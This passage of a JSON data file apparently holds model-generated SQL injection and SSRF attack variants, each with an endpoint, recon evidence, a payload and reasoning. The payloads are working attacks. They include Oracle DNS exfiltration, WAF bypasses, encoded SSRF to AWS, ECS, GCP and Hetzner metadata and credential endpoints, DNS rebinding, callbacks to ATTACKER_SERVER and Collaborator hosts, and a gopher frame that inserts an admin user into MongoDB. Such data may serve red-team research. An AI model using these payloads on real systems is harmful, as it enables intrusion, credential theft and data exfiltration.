+   "payload": "SELECT UTL_INADDR.GET_HOST_ADDRESS(LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM = 1), 1, 20)))) || '.01.oob.example') FROM dual",
+   "injection_point": "header",
+   "expected_success_signal": "Sequential 01 then 02 hex labels under .oob.example resolved at the attacker nameserver within seconds while the page still returns HTTP 200",
+   "confidence": 0.82,
+   "reasoning": "The header value is concatenated into the WHERE/ORDER BY clause without the normalisation applied to query parameters, so the Oracle expression survives the keyword filter. The nested DNS lookup fires during statement execution, so the callback is logged even though the returned row is discarded when the ACL error is raised."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /api/v1/inventory/snapshot",
+   "target_param": "warehouse",
+   "recon_evidence": "Oracle 19c confirmed by a UNION column-count error referencing v$version; the segment has DNS-only egress; the WAF blacklist covers xp_cmdshell, dbms_scheduler and lib but not UTL_INADDR or RAWTOHEX; responses are long enough that a full banner dump would exceed the label length limit.",
+   "planner_rationale": "Exfiltrate sequentially: push the first 20 bytes of v$version.banner as a lowercase hex DNS label and increment the suffix for later chunks.",
+   "vuln_class": "sqli",
+   "payload": "SELECT UTL_INADDR.GET_HOST_ADDRESS(LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM = 1), 1, 20)))) || '.01.oob.example') FROM dual",
+   "injection_point": "query",
+   "expected_success_signal": "One hex label per request, e.g. 01 then 02 in the .oob.example zone, captured at the authoritative server even though the page body shows an ORA error",
+   "confidence": 0.86,
+   "reasoning": "v$version is directly selectable and the function stack (UTL_INADDR, RAWTOHEX, CAST_TO_RAW) matches none of the observed blacklist signatures, so the expression is injected unchanged. Substr caps each chunk at 20 bytes to stay within DNS label limits, and the resolver already has the data before the ACL error aborts the query."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /store/checkout",
+   "target_param": "cart_ref",
+   "recon_evidence": "PostgreSQL 14 backend; the middleware strips every single quote from cookie values before concatenating them into ... WHERE cart_ref = '$cart_ref' ...; an empty cart_ref produces a clean syntax error page instead of a WAF block, confirming the statement is still parsed server side; no quote character can reach the database.",
+   "planner_rationale": "Dollar-quoting is native to PostgreSQL, so $$...$$ replaces the quoted literal entirely and keeps the SELECT probe alive behind the quote filter.",
+   "vuln_class": "sqli",
+   "payload": "SELECT $$hacktricks$$",
+   "injection_point": "cookie",
+   "expected_success_signal": "The literal text hacktricks echoed back in the page or error payload, confirming server-side evaluation with zero quote characters",
+   "confidence": 0.88,
+   "reasoning": "The filter only deletes apostrophes, and dollar signs are untouched, so the payload is assembled as ... WHERE cart_ref = ''SELECT $$hacktricks$$'' and PostgreSQL parses $$ as a quoted constant delimiter. This proves the injection point and evaluation context without any character the filter targets."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "POST /api/v3/orders/lookup",
+   "target_param": "order_id",
+   "recon_evidence": "MySQL 8 behind AWS WAF managed rules; every or, and, union, sleep and comment token inside JSON body values returns 403, while values that are syntactically valid numbers or decimal/scientific literals pass JSON schema validation and reach the query.",
+   "planner_rationale": "Replace the boolean OR with a truthy scientific-notation literal (1337.1337e1) that MySQL evaluates numerically but the WAF tokeniser never classifies as an OR-based payload.",
+   "vuln_class": "sqli",
+   "payload": "-1' or 1337.1337e1 or '1'='1",
+   "injection_point": "body",
+   "expected_success_signal": "An unrelated order record returned with HTTP 200 where the classic or 1=1 body value returns 403",
+   "confidence": 0.9,
+   "reasoning": "The WAF is clearly token-based against classic OR syntax, and 1337.1337e1 is a well-formed DOUBLE literal that MySQL parses as 13371.33 and treats as non-zero in boolean context. Because it contains no or/and keyword, the request clears the rule set while the surrounding quotes still build the same three-clause boolean expression."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /store/p/25/reviews",
+   "target_param": "product_id",
+   "recon_evidence": "The /store/p/{product_id}/reviews segment is substituted into ... WHERE product_id = %s ORDER BY created_at; the WAF inspects the decoded path segment and blocks segments containing or/and tokens with403; the framework router forwards apostrophes unencoded for this route; the value is coerced to a numeric comparison.",
+   "planner_rationale": "Keep the same path shape but swap the OR comparison for a truthy scientific-notation literal so the WAF path regex finds no boolean keyword.",
+   "vuln_class": "sqli",
+   "payload": "-1' or 1337.1337e1 or '1'='1",
+   "injection_point": "path",
+   "expected_success_signal": "Review list belonging to a different product rendered with HTTP 200, versus403 for the classic or-true path segment",
+   "confidence": 0.66,
+   "reasoning": "The payload maps onto a single numeric path segment and MySQL evaluates 1337.1337e1 as a non-zero double, so the boolean chain stays true without any blocked keyword. Confidence is lower because path segments are commonly percent-encoded or normalised by the router before reaching the driver, and the surviving quote characters were only partially confirmed by the observed 403-versus-200 difference."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "POST /v1/link/preview",
+   "target_param": "target_url",
+   "recon_evidence": "Submitting a URL to an internal 10.x host returned the fetched page title and meta description in the preview card, proving the backend retrieves and renders arbitrary URLs server-side.",
+   "planner_rationale": "Preview renderer fetches arbitrary URLs on the server; point it at loopback to expose services behind the firewall.",
+   "vuln_class": "ssrf",
+   "payload": "http://127.0.0.1:80",
+   "injection_point": "body",
+   "expected_success_signal": "Preview card populated with the HTML title/content of the web service listening on the instance's own loopback at port 80",
+   "confidence": 0.9,
+   "reasoning": "The observed rendering of internal 10.x content proves a full-response SSRF primitive with no scheme or host restriction noted, so the plain dotted-quad loopback payload is the direct next probe; the returned preview body is the success signal."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /webhooks/test",
+   "target_param": "callback",
+   "recon_evidence": "A regex on callback= rejects any dotted-quad IPv4 literal with an 'internal address profile restricted' error, yet a hostname URL passes and is fetched immediately without DNS pinning.",
+   "planner_rationale": "The blocklist matches dotted-quad only; the decimal integer form of loopback contains no dots and resolves in socket libraries.",
+   "vuln_class": "ssrf",
+   "payload": "http://2130706433/",
+   "injection_point": "query",
+   "expected_success_signal": "Webhook test sends a request whose response body/status originates from the service on 127.0.0.1 instead of the filter error",
+   "confidence": 0.85,
+   "reasoning": "2130706433 is 127.0.0.1 packed as a 32-bit integer; it is accepted directly by socket-level DNS/URL parsing while the dotted-quad regex never matches, defeating exactly the observed filter behaviour."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "POST /functions/debug/invoke",
+   "target_param": "probe_url",
+   "recon_evidence": "Debug headers (AMS 2018-06-01 / serverless-AWS-Lambda response headers) and a leaked AWS_LAMBDA_FUNCTION_NAME environment marker confirm the app runs inside an AWS Lambda worker.",
+   "planner_rationale": "Inside a Lambda worker, the runtime interface is bound to localhost:9001 and is only reachable via SSRF; fetch its pending-invocation endpoint.",
+   "vuln_class": "ssrf",
+   "payload": "http://localhost:9001/2018-06-01/runtime/invocation/next",
+   "injection_point": "body",
+   "expected_success_signal": "JSON body of the next queued Lambda invocation (requestId, event payload) returned in the debug-invoke response",
+   "confidence": 0.92,
+   "reasoning": "The Lambda runtime API serves /2018-06-01/runtime/invocation/next on localhost:9001 inside every worker; with serverless headers confirming the environment, this internal-only endpoint is reachable exclusively through the SSRF fetch primitive."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /import/screenshot",
+   "target_param": "page",
+   "recon_evidence": "The screenshot service fetches the supplied URL and the rendered image shows remote page content; a dotted-quad 127.0.x.x attempt was blocked by an allowlist that only matches literal dotted-quad addresses.",
+   "planner_rationale": "The dotted-quad blocklist has a canonicalization gap; submit loopback as the integer form, which normalizes to the same address internally.",
+   "vuln_class": "ssrf",
+   "payload": "http://2130706433/",
+   "injection_point": "query",
+   "expected_success_signal": "Rendered screenshot of the rendered screenshot of the service running on the host's own loopback instead of a blocked-address error",
+   "confidence": 0.7,
+   "reasoning": "The observed block appears to be a literal dotted-quad matcher, and integer-packed 127.0.0.1 contains no dots to match; glibc and common URL parsers accept this form, so the fetcher resolves it back to loopback, though exact parser behaviour is speculative."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /integrations/healthcheck",
+   "target_param": "upstream",
+   "recon_evidence": "Deployment manifest and Datadog serverless tracing headers identify the endpoint's backend as an AWS Lambda function; an in-band fetch of an attacker URL returns the raw response body.",
+   "planner_rationale": "The Lambda runtime interface hands out queued invocations on localhost:9001 — an internal-only endpoint reachable only through this SSRF.",
+   "vuln_class": "ssrf",
+   "payload": "http://localhost:9001/2018-06-01/runtime/invocation/next",
+   "injection_point": "query",
+   "expected_success_signal": "Healthcheck response contains a pending invocation's JSON payload (headers including Lambda-Runtime-Aws-Request-Id and the event document) from the runtime API",
+   "confidence": 0.88,
+   "reasoning": "Serverless tracing headers plus raw body reflection confirm both the Lambda host environment and full-response SSRF; the runtime API on localhost:9001 is the canonical internal target, and a 'next' call returning a queued invocation is the definitive success signal."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "POST /api/v1/media/proxy",
+   "target_param": "image_url",
+   "recon_evidence": "The media proxy fetches the supplied image_url server-side and echoes the raw upstream body in the 502 error page when the fetch fails; responses to external CDNs confirm outbound fetches are unrestricted and the app runs on EC2.",
+   "planner_rationale": "Image proxy reaches internal hosts; aim it at the metadata service to confirm the cloud hit and enumerate credential paths.",
+   "vuln_class": "ssrf",
+   "payload": "http://169.254.169.254/latest/meta-data/",
+   "injection_point": "body",
+   "expected_success_signal": "Directory listing containing ami-id, hostname, iam, etc. echoed in the proxy error body.",
+   "confidence": 0.87,
+   "reasoning": "The proxy performs a server-side fetch of image_url and reflects the upstream response, so pointing it at 169.254.169.254 should return the metadata directory listing and map the way to IAM credentials."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /webhooks/validate",
+   "target_param": "callback",
+   "recon_evidence": "Recon shows a WAF rule returning 403 specifically for requests whose callback value contains the literal dotted string 169.254.169.254, while the metadata path /latest/meta-data/ alone passes unblocked.",
+   "planner_rationale": "Dotted metadata IP is WAF-blocked; switch to the decimal integer encoding the regex misses.",
+   "vuln_class": "ssrf",
+   "payload": "http://2852039166/latest/meta-data/",
+   "injection_point": "query",
+   "expected_success_signal": "Metadata directory listing returned instead of the expected 403 WAF block.",
+   "confidence": 0.72,
+   "reasoning": "2852039166 is the 32-bit integer form of 169.254.169.254, so the socket layer resolves it to the metadata address while the WAF's dotted-quad regex never matches, which is the documented bypass for the observed behaviour."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "POST /integrations/webhook/test",
+   "target_param": "webhook_url",
+   "recon_evidence": "The webhook test feature issues an outbound HTTP request to webhook_url and returns the first 2 KB of the response; every IPv4 textual form of 169.254.169.254 (dotted, decimal, octal) is blocked by the egress filter.",
+   "planner_rationale": "All IPv4 encodings of the metadata IP are filtered; try the IPv6-mapped representation the filter does not cover.",
+   "vuln_class": "ssrf",
+   "payload": "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
+   "injection_point": "body",
+   "expected_success_signal": "Metadata directory listing appearing in the returned webhook response snippet.",
+   "confidence": 0.66,
+   "reasoning": "::ffff:a9fe:a9fe is the IPv6-mapped form of 169.254.169.254, so a stack that accepts IPv6 literals translates it back to the link-local IPv4 metadata address and slips past an IPv4-only egress filter."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /cdn/thumbnail/{source}",
+   "target_param": "source",
+   "recon_evidence": "The thumbnail route takes the source URL directly from the path segment (after /cdn/thumbnail/) and fetches it server-side; the segpath is not normalised and the app runs on EC2.",
+   "planner_rationale": "Path-based fetch is unauthenticated and unnormalised; use it to reach the metadata service.",
+   "vuln_class": "ssrf",
+   "payload": "http://169.254.169.254/latest/meta-data/",
+   "injection_point": "path",
+   "expected_success_signal": "Metadata directory listing (ami-id, hostname, iam) returned as the thumbnail body.",
+   "confidence": 0.8,
+   "reasoning": "Because the source URL is taken verbatim from the path segment and fetched server-side, supplying the metadata URL in the path should trigger the same internal fetch and return the directory listing."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /api/v2/preview",
+   "target_param": "X-Resource-Location",
+   "recon_evidence": "The preview endpoint reads a URL from the X-Resource-Location request header and fetches it to render a link preview; IPv4 textual forms of the metadata address are rejected, but header values are not run through the same egress validation as query parameters.",
+   "planner_rationale": "Header-supplied fetch bypasses the query-side egress validation; use the IPv6-mapped metadata address to reach IMDS.",
+   "vuln_class": "ssrf",
+   "payload": "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
+   "injection_point": "header",
+   "expected_success_signal": "Metadata directory listing rendered into the link preview response.",
+   "confidence": 0.6,
+   "reasoning": "The header value feeds the same server-side fetch, and using the IPv6-mapped encoding of 169.254.169.254 relies on the header path not sharing the IPv4-focused egress filter, which makes the outcome somewhat speculative."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /internal/fetch-resource",
+   "target_param": "resource_url",
+   "recon_evidence": "Container environment exposes AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/xxxx and ECS task metadata endpoint reachable from the pod network.",
+   "planner_rationale": "Reconstruct the task-role credential URI against the ECS metadata address observed in the environment.",
+   "vuln_class": "ssrf",
+   "payload": "http://169.254.170.2/v2/credentials/",
+   "injection_point": "query",
+   "expected_success_signal": "Response body contains AccessKeyId, SecretAccessKey and Token fields for the ECS task role",
+   "confidence": 0.9,
+   "reasoning": "ECS tasks fetch role credentials from 169.254.170.2 rather than the EC2 IMDS address, and the relative URI from AWS_CONTAINER_CREDENTIALS_RELATIVE_URI completes the path, so the observed container environment directly selects this payload."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "POST /api/v2/proxy",
+   "target_param": "target",
+   "recon_evidence": "Application runs as an ECS task behind Fargate; IMDSv2 hop limit blocks 169.254.169.254 but the container credential endpoint answers on the link-local address.",
+   "planner_rationale": "The proxy takes the destination as a form field, so post the ECS credential URL as the target body parameter.",
+   "vuln_class": "ssrf",
+   "payload": "http://169.254.170.2/v2/credentials/",
+   "injection_point": "body",
+   "expected_success_signal": "JSON containing AccessKeyId/SecretAccessKey/Token for the task role returned in the proxy response",
+   "confidence": 0.85,
+   "reasoning": "Because IMDSv2 is unreachable from the task, the only credential source is the ECS agent endpoint on 169.254.170.2; sending it as the form-encoded target parameter of the proxy matches the observed request format."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /api/link-preview",
+   "target_param": "href",
+   "recon_evidence": "Workload deployed on GCP; compute metadata v1 requires the Metadata-Flavor: Google header while the v1beta1 endpoint returns 403, and the fetcher only forwards user-controlled query parameters.",
+   "planner_rationale": "Use gopher to emit a raw HTTP request that includes the mandatory Metadata-Flavor header the fetcher cannot set.",
+   "vuln_class": "ssrf",
+   "payload": "gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a",
+   "injection_point": "query",
+   "expected_success_signal": "Instance ssh-keys attribute returned in the preview body with Metadata-Flavor satisfied in the raw request",
+   "confidence": 0.8,
+   "reasoning": "gopher permits arbitrary raw TCP bytes, so the SSRF can carry the exact HTTP request including Metadata-Flavor: Google that plain URL fetching cannot supply, which is precisely the header gate observed during recon."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "POST /render/fetch",
+   "target_param": "source_url",
+   "recon_evidence": "Header-based fetch endpoint on a GCP instance where the renderer rejects direct metadata.google.internal hosts but forwards the X-Source-Url header verbatim to its HTTP client.",
+   "planner_rationale": "Supply the crafted gopher request through the header the renderer copies into its outbound request.",
+   "vuln_class": "ssrf",
+   "payload": "gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a",
+   "injection_point": "header",
+   "expected_success_signal": "SSH keys from the instance attributes appear in the rendered output",
+   "confidence": 0.72,
+   "reasoning": "The header-controlled fetcher still cannot attach Metadata-Flavor to an http URL, so gopher's raw request bytes are required; confidence is slightly lower because it depends on the client honouring an arbitrary scheme supplied via a header."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /api/v1/healthcheck/upstream",
+   "target_param": "upstream_url",
+   "recon_evidence": "Cluster fingerprints point to Hetzner Cloud (floating IP and hcloud agent banners); AWS and GCP metadata paths returned no content while the link-local address responded.",
+   "planner_rationale": "Probe the vendor-specific Hetzner metadata route to enumerate the instance from the internal network position.",
+   "vuln_class": "ssrf",
+   "payload": "http://169.254.169.254/hetzner/v1/metadata",
+   "injection_point": "query",
+   "expected_success_signal": "JSON containing hostname, instance-id, region and public IPv4/IPv6 addresses",
+   "confidence": 0.82,
+   "reasoning": "Hetzner exposes its inventory at /hetzner/v1/metadata on the link-local address, matching the observed vendor fingerprints, so this path yields the instance metadata the standard AWS-style listing does not."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_3",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "POST /api/v2/media/render",
+   "target_param": "source_url",
+   "recon_evidence": "Render worker accepts an arbitrary source_url and always terminates after a fixed 5s timeout; no scheme denylist observed when testing http/https/data, and outbound connect errors surface as a generic 'unsupported source' string rather than a validation error.",
+   "planner_rationale": "sftp forces an SSH handshake to an external host, giving us a clean OOB proof that the renderer dials arbitrary schemes from inside the VPC.",
+   "vuln_class": "ssrf",
+   "payload": "sftp://ATTACKER_SERVER:11111/",
+   "injection_point": "body",
+   "expected_success_signal": "Full SSH-2.0 identification string from the renderer's sftp client logged on our listener, paired with the render job failing at the 5s timeout",
+   "confidence": 0.82,
+   "reasoning": "Because the renderer appears to hand the string straight to a URL-aware fetch library rather than validating the scheme, sftp survives and triggers a real SSH banner exchange. The resulting client version string fingerprints the internal egress stack and confirms the injection point is the JSON body field."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_3",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "POST /webhooks/deliver",
+   "target_param": "payload_url",
+   "recon_evidence": "Responses are delivered by a dispatcher that logs a 'validated url' line at enqueue time and a separate 'resolved host' line at send time; a replay of the same hostname produced two different A records in the dispatcher log.",
+   "planner_rationale": "Double resolution gives us TOCTOU: the validator sees the public address while the dispatcher connects to the rebound169.254.169.254 metadata endpoint.",
+   "vuln_class": "ssrf",
+   "payload": "make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+   "injection_point": "body",
+   "expected_success_signal": "Dispatcher 'resolved host' line showing 169.254.169.254 and a delivery attempt carrying the instance metadata document back through the webhook target",
+   "confidence": 0.87,
+   "reasoning": "The two distinct A records observed across enqueue and send confirm a genuine resolve-then-connect gap, and the rotating-answer hostname lets the first lookup pass validation while the second lands on the link-local metadata IP. The payload fits because it needs only the hostname itself, with no scheme or path that a filter would choke on."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_3",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /dashboard/widgets/preview",
+   "target_param": "widget_src",
+   "recon_evidence": "The preview endpoint ignores the src query argument and instead renders whatever URL is stored in the widget_src cookie; setting the cookie to http://127.0.0.1:6379/ produced a connection-refused page rendered in the widget iframe, proving server-side fetches honour cookie-supplied URLs.",
+   "planner_rationale": "Cookie injection bypasses any parameter-level scheme filter, so we can drive an out-of-band SSH handshake straight from a value the app treats as trusted user state.",
+   "vuln_class": "ssrf",
+   "payload": "sftp://ATTACKER_SERVER:11111/",
+   "injection_point": "cookie",
+   "expected_success_signal": "SSH client identification banner captured on our listener when the preview widget renders with the attacker-supplied widget_src cookie",
+   "confidence": 0.61,
+   "reasoning": "The loopback fetch proved the cookie value is dereferenced server-side, so an sftp URL in the same slot should reach the same fetch library. Confidence is lower because the iframe rendering path may re-encode or JSON-decode cookie values, which would corrupt the scheme before the request is issued."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_3",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /render/{remote_host}/{asset_path}",
+   "target_param": "remote_host",
+   "recon_evidence": "Reverse-proxy asset endpoint resolves {remote_host} twice per request - once for its own upstream allowlist check and once for the proxied connection - and a wildcard cert on *.internal.example accepted arbitrary hostnames without rejecting them.",
+   "planner_rationale": "Injecting the rebinding hostname as the path segment satisfies the wildcard cert and the allowlist on the first lookup, then connects to the metadata IP on the second.",
+   "vuln_class": "ssrf",
+   "payload": "make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+   "injection_point": "path",
+   "expected_success_signal": "Upstream connection from the proxy to 169.254.169.254 and a proxied response body containing cloud metadata keys (e.g. iam/security-credentials/)",
+   "confidence": 0.79,
+   "reasoning": "The hostname occupies a path segment, so it passes path-shape validation and the wildcard certificate without any encoding tricks, and the rotate-answers behaviour defeats the allowlist check performed before the connection is made. The mechanism directly matches the observed double-resolution gap, though confidence is tempered because an allowlist could conceivably be evaluated after the proxied connect in some proxy builds."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "POST /api/integrations/webhooks",
+   "target_param": "webhook_url",
+   "recon_evidence": "Saving an integration triggers an immediate 'test notification' POST to the user-supplied webhook URL; the UI returns the same generic 'Saved' toast whether the URL points at a live host or an RFC 5737 test-net address, indicating no egress feedback.",
+   "planner_rationale": "Blind fetcher with immediate side effect - spend one request on an OOB host to confirm server-side outbound connectivity before deeper probing.",
+   "vuln_class": "ssrf",
+   "payload": "http://BURP-COLLABORATOR-SUBDOMAIN",
+   "injection_point": "body",
+   "expected_success_signal": "DNS resolution plus an HTTP POST (the test-notification body) logged in Burp Collaborator within seconds of saving the integration.",
+   "confidence": 0.92,
+   "reasoning": "The save action makes the server POST directly to whatever URL is stored, and the identical UI response for dead and live hosts shows the fetch is blind. A plain Collaborator hostname is the minimal probe: confirmation requires no visible response, only the OOB log."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /internal-proxy/fetch",
+   "target_param": "resource",
+   "recon_evidence": "resource=http://127.0.0.1/admin is rejected with 403 'blocked path', and the single-encoded http://127.0.0.1/%2561dmin is also blocked after one decode, indicating the validator normalizes exactly one round of percent-encoding before path matching.",
+   "planner_rationale": "Match the validator's single decode with a doubly encoded path so its check sees no target string while the fetch layer decodes fully.",
+   "vuln_class": "ssrf",
+   "payload": "http://127.0.0.1/%2561dmin",
+   "injection_point": "query",
+   "expected_success_signal": "Proxy returns 200 and relays the internal /admin page (or its auth wall) instead of the generic 403 'blocked path' body.",
+   "confidence": 0.88,
+   "reasoning": "%2561dmin decodes once to %61dmin, which fails the literal 'admin' match, and a second decoding by the fetching layer restores /admin on the loopback host. Bypassing a one-shot-decoding validator requires exactly one extra encoding layer, which is what this payload encodes."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "POST /ingest/<project>/store/",
+   "target_param": "filename (Sentry stacktrace frame)",
+   "recon_evidence": "The submission endpoint is a Sentry-compatible error store running with source-context fetching enabled, and egress monitoring shows the ingestion backend retrieving arbitrary URLs named in stacktrace frames while ingress filtering blocks direct internal requests.",
+   "planner_rationale": "Turn the error pipeline itself into the SSRF primitive: forge a report whose frame filename is an attacker-controlled URL.",
+   "vuln_class": "ssrf",
+   "payload": "{\"exception\":{\"values\":[{\"stacktrace\":{\"frames\":[{\"filename\":\"https://ATTACKER_SERVER/oob.js\"}]}}]}}",
+   "injection_point": "body",
+   "expected_success_signal": "HTTP GET for /oob.js arriving at ATTACKER_SERVER from the ingestion service's egress IP after the crafted report is accepted.",
+   "confidence": 0.87,
+   "reasoning": "Sentry resolves source files listed in stacktrace frame filenames without restricting scheme or host, so the JSON body alone fully determines the outbound request. The egress-allowed/ingress-filtered asymmetry makes this the one channel where a callback from the victim network is obtainable."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /render/preview",
+   "target_param": "X-Preview-Source (header)",
+   "recon_evidence": "The renderer's worker logs show 'fetching preview source' taken verbatim from the client-controlled X-Preview-Source header; unreachable values hang for ~30s then return sender-invariant HTML, i.e. no differential feedback for live vs. dead hosts.",
+   "planner_rationale": "Header-driven fetch with blind behavior - confirm with a low-cost OOB hostname before spending requests on internal targets.",
+   "vuln_class": "ssrf",
+   "payload": "http://BURP-COLLABORATOR-SUBDOMAIN",
+   "injection_point": "header",
+   "expected_success_signal": "DNS+HTTP interaction logged in Burp Collaborator coming from the renderer's worker egress IP.",
+   "confidence": 0.85,
+   "reasoning": "The fetch source is read from a request header with no observable response difference, so a Collaborator hostname is the correct first probe: the OOB log is the only channel that can confirm the fetch actually happened."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /legacyproxy/{url}",
+   "target_param": "url (path remainder)",
+   "recon_evidence": "Route configuration rewrites /legacyproxy/<remainder> by treating the trailing path portion as a fully qualified destination URL, and no scheme or host allowlist was observed when the legacy proxy relayed a public HTTP source during enumeration.",
+   "planner_rationale": "Cheapest confirmation: OOB hostname through the unvalidated path-based forwarder to prove arbitrary outbound requests.",
+   "vuln_class": "ssrf",
+   "payload": "http://BURP-COLLABORATOR-SUBDOMAIN",
+   "injection_point": "path",
+   "expected_success_signal": "DNS resolution and HTTP request logged in Burp Collaborator referencing the legacy proxy's egress IP as the client.",
+   "confidence": 0.8,
+   "reasoning": "A forwarder that accepts the destination as a free-form path suffix with no observed allowlist will relay any URL supplied. Confirming with a Collaborator hostname avoids depending on any response-side behavior of the legacy proxy."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_5",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "POST /api/v4/projects/import",
+   "target_param": "url",
+   "recon_evidence": "The project import endpoint fetches the supplied git URL server-side and its response reflects the fetched repository's default branch; a URL whose path contains an http.<url>.* fragment is silently folded into git's per-URL configuration.",
+   "planner_rationale": "Smuggle an http.proxy setting into the import URL's path so git routes the fetch for that remote through the attacker listener.",
+   "vuln_class": "ssrf",
+   "payload": "http://user@google.com/.proxy=http://ATTACKER_SERVER:8500",
+   "injection_point": "query",
+   "expected_success_signal": "The repository's .git/config gains the attacker proxy; git HTTP traffic for that remote flows through the attacker listener.",
+   "confidence": 0.85,
+   "reasoning": "The path component of the import URL is parsed into per-URL git http config, so embedding .proxy= forces git's own client to use an attacker-controlled proxy during the server-side clone. The observed silent config folding confirms the injection reaches git rather than being rejected as a malformed URL."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_5",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "POST /api/v2/integrations/webhook/test",
+   "target_param": "callback_url",
+   "recon_evidence": "The webhook test action connects to the supplied callback_url from the server and returns the raw bytes received, and it accepts arbitrary URL schemes without validating them, including gopher.",
+   "planner_rationale": "Use the unvalidated callback_url to deliver a pre-built gopher MongoDB insert frame to the local database port.",
+   "vuln_class": "ssrf",
+   "payload": "gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%07%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00%00%00administrator%00%00%00",
+   "injection_point": "body",
+   "expected_success_signal": "An admin user row is created in the target MongoDB collection, observable through the application's user list or a follow-up authenticated login.",
+   "confidence": 0.75,
